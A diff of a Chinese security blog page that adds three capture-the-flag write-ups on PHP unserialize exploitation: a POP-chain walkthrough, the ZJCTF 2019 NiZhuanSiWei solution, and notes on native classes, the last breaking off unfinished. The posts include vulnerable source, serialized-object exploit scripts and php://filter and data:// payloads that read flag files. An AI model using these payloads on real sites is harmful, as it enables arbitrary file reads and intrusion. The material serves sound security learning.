@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18.33px;">脚本编写</a>
+						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,245 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-PHP反序列化之pop链查找" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE%E6%9F%A5%E6%89%BE/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE%E6%9F%A5%E6%89%BE/">
+        PHP反序列化之pop链查找
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php反序列化之POP链"><a href="#php反序列化之POP链" class="headerlink" title="php反序列化之POP链"></a>php反序列化之POP链</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>列举：<br>__wakeup() //使用反序列函数unserialize()时触发</p>
+<p>__sleep() //使用serialize时触发</p>
+<p>__destruct() //对象销毁时触发</p>
+<p>__construct() //用于创建对象，当实例化对象时被触发</p>
+<p>__call() //在对象上下文中调用不可访问的方法时触发</p>
+<p>__callStatic() //在静态上下文中调用不可访问的方法时触发</p>
+<p>__get() //用于从不可访问的属性读取数据</p>
+<p>__set() //用于将数据写入不可访问属性</p>
+<p>__isset() //在不可访问的属性上调用isset()或empty()触发</p>
+<p>__unset() //在不可访问的属性上使用unset()时触发</p>
+<p>__toString() //把类当作字符串使用时触发</p>
+<p>__invoke() //脚本尝试将对像调用为函数时触发</p>
+<h2 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    </span><br><span class="line">    /*Read类的一个函数*/</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value)); #将文件的内容以字符串的形式读取出来，并进行base64的加密</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /*当以函数的方法调用一个Read类实例时，会先调用__invoke方法*/</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var); #将被base64加密的文件的内容赋值给$comtent</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    </span><br><span class="line">    /*当初始化一个Show实例的时候，默认他的file属性为index.php*/</span><br><span class="line">    public function __consturct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file; #将index.php赋值给$this-&gt;source</span><br><span class="line">        echo $this-&gt;source.&quot;Welcome&quot;.&quot;&lt;br&gt;&quot;; #显示index.php  Welcomee</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /*当一个Show的类实例被当作一个字符串使用时，会。。。。*/</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;//注意这里，很奇怪。调用了一个从来没有的类属性，</span><br><span class="line">        //所以会调用get方法。而同时正常到$this-&gt;str[&#x27;str&#x27;]就返回了键值了，但是它后面又有一个取属性的操作。</span><br><span class="line">        //所以想$this-&gt;str[&#x27;str&#x27;]本身就是一个有source属性的一个类的实例</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /*这应该不是一个内置的魔术方法，，，*/</span><br><span class="line">    public function _show()&#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source))&#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /*当对一个Show实例进行反序列化之前调用*/</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;,$this-&gt;source))&#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source=&quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /*在获取一个Test的类成员的时候调用：$a-&gt;bbb*/</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop1.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>在输入hello这个变量后，调用unserialize()反序列化函数之前，先调用__wakeup()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;</span><br><span class="line">       if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;,$this-&gt;source))&#123;</span><br><span class="line">           echo &quot;hacker&quot;;</span><br><span class="line">           $this-&gt;source=&quot;index.php&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>里面有preg_match正则匹配函数，将一个类实例化的source属性，也是另一个类的对象实例化，以字符串的形式进行遍历匹配，从而触发__toString()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">       return $this-&gt;str[&#x27;str&#x27;]-&gt;source;//注意这里，很奇怪。调用了一个从来没有的类属性，</span><br><span class="line">       //所以会调用get方法。而同时正常到$this-&gt;str[&#x27;str&#x27;]就返回了键值了，但是它后面又有一个取属性的操作。</span><br><span class="line">       //所以想$this-&gt;str[&#x27;str&#x27;]本身就是一个有source属性的一个类的实例</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>方法查找到了str[]这个数组，而数组里的str是一个key键，而value值代表的是source，而str[‘str’]需要是一个类的实例化，但是这个属性在show类中却不存在，且return访问里面的数值并返回，所以触发__get()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)&#123;</span><br><span class="line">       $function = $this-&gt;p;</span><br><span class="line">       return $function();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>而p为一个类的对象实例化的p属性，且将属性取出来，并给$function，然后用函数的方式执行，触发__invoke()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke()&#123;</span><br><span class="line">       $content = $this-&gt;file_get($this-&gt;var); #将被base64加密的文件的内容赋值给$comtent</span><br><span class="line">       echo $content;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>而__invoke()函数中调用了file_get()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function file_get($value)</span><br><span class="line">   &#123;</span><br><span class="line">       $text = base64_encode(file_get_contents($value)); #将文件的内容以字符串的形式读取出来，并进行base64的加密</span><br><span class="line">       return $text;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>然后给read类下的对象实例化的属性var赋值一个flag.php</p>
+<p>构造一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Read&#123;</span><br><span class="line"></span><br><span class="line">public $var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line"></span><br><span class="line">public $source;</span><br><span class="line">public $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line"></span><br><span class="line">public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Read();</span><br><span class="line">$b=new Show();</span><br><span class="line">$c=new Test();</span><br><span class="line"></span><br><span class="line">$b-&gt;source=$b;</span><br><span class="line">$b-&gt;str[&#x27;str&#x27;]=$c;</span><br><span class="line">$c-&gt;p=$a;</span><br><span class="line">$a-&gt;var=&#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到一个序列化的数值，然后构造payload</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-ZJCTF 2019-WEB-NiZhuanSiWei" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/ZJCTF%202019-WEB-NiZhuanSiWei/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/ZJCTF%202019-WEB-NiZhuanSiWei/">
+        ZJCTF 2019-WEB-NiZhuanSiWei
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="ZJCTF 2019]NiZhuanSiWei"></a>ZJCTF 2019]NiZhuanSiWei</h1><p>代码审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;)) #判断$text是否为空以及文件里的内容是否为welcome to the zjctf</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125; #如果$file的文件名有flag，则显示Not now并退出程序</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line">        include($file);  //useless.php  #包含并执行文件里的内容</span><br><span class="line">        $password = unserialize($password); #对$password进行反序列化</span><br><span class="line">        echo $password; #显示$password的内容</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看到file_get_contents()和include()两个文件包含函数，我们可以想到是不是可以使用data伪协议。通过判断第一个if，我们可以知道我们要经过file_get_contents()函数，此时<br>我们可以使用data协议导入内容，从而经过第一个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>
+<p>然后我们看到有一个include()函数，同时，我们还能看到一个提示useless.php。此时，我们可以通过php伪协议来对useless.php文件进行读取，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p>我们可以读取到用base64加密的useless.php的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure>
+
+<p>通过base64解密，我们可以得到一段php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>通过这段php代码，我们可以构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;</span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p>我们将显示结果赋值于$password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>然后我们构造最后的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后查看页面源代码，我们可以找到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-php反序列化之原生类" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB/">
+        php反序列化之原生类
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php反序列化之原生类"><a href="#php反序列化之原生类" class="headerlink" title="php反序列化之原生类"></a>php反序列化之原生类</h1><p>SLP类存在可以进行文件处理和迭代的类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Directorylterator                                遍历目录</span><br><span class="line"></span><br><span class="line">Filesystemlterator                              遍历目录</span><br><span class="line"></span><br><span class="line">Globlterator                                      遍历目录，但是不同点在于它可以通配，例如var/html/www/flag*</span><br><span class="line"></span><br><span class="line">SplFileObject                                     读取文件，按行读取，多行需要遍历</span><br><span class="line"></span><br><span class="line">finfo/finfo_open()                               需要两个参数</span><br><span class="line"></span><br><span class="line">reflectionMethod($class,$function)     返回类和方法</span><br><span class="line"></span><br><span class="line">getDocComment()                              返回reflectionMethod的值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>例如：安恒月赛DASCTF三月娱乐赛（ez_serialize)</p>
+<p>审计源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">class A&#123; </span><br><span class="line">		public $class; </span><br><span class="line">		public $para; </span><br><span class="line">		public $check; </span><br><span class="line">	public function __construct() &#123;</span><br><span class="line"> 					$this-&gt;class = &quot;B&quot;; </span><br><span class="line">					$this-&gt;para = &quot;ctfer&quot;;</span><br><span class="line">					 echo new $this-&gt;class ($this-&gt;para);</span><br><span class="line"> &#125;</span><br><span class="line"> 	public function __wakeup() &#123; </span><br><span class="line">		$this-&gt;check = new C;</span><br><span class="line">		 if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; </span><br><span class="line">						</span><br><span class="line"></span><br><span class="line">			echo new $this-&gt;class ($this-&gt;para); </span><br><span class="line">&#125; </span><br><span class="line">		else die(&#x27;bad hacker~&#x27;);</span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line">class B&#123;</span><br><span class="line"> 	var $a;</span><br><span class="line"> 	public function __construct($a) &#123; </span><br><span class="line">		$this-&gt;a = $a;</span><br><span class="line">		 echo (&quot;hello &quot;.$this-&gt;a); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">class C&#123; </span><br><span class="line">	function vaild($code)&#123; </span><br><span class="line">		$pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;;</span><br><span class="line">		 if (preg_match($pattern, $code))&#123; </span><br><span class="line">			return false; </span><br><span class="line">&#125; </span><br><span class="line">			else return true; </span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">	if(isset($_GET[&#x27;pop&#x27;]))&#123; </span><br><span class="line">		unserialize($_GET[&#x27;pop&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">	else&#123; </span><br><span class="line">		$a=new A; </span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>
+
+<p>可以构造exp’</p>
